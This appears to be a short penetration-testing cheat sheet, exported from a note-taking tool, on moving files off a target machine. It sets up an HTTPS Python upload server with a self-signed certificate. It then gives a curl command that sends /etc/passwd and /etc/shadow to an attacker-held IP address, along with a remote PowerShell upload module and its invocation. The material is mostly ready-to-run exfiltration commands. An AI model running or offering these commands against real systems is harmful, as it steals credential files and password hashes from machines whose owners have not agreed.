# HTTPS Python UploadServer Module

OS: Linux, Windows
Description: Set up Python Uploadserver. -Uploading with curl and Powershell examples included.
Security Domains: File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21)
Target_Technology: Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21), python (https://www.notion.so/python-1444c8e523768064b118fb3c0d424051?pvs=21), PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21), HTTPs (https://www.notion.so/HTTPs-1434c8e523768019a037eea3c9eef66c?pvs=21)

```jsx
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate /root/server.pem

```

- Upload using Curl.

```jsx
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

- PowerShell  Import Module Here

```jsx
https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1
```

- Upload to server

```jsx
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File YOURFILE
```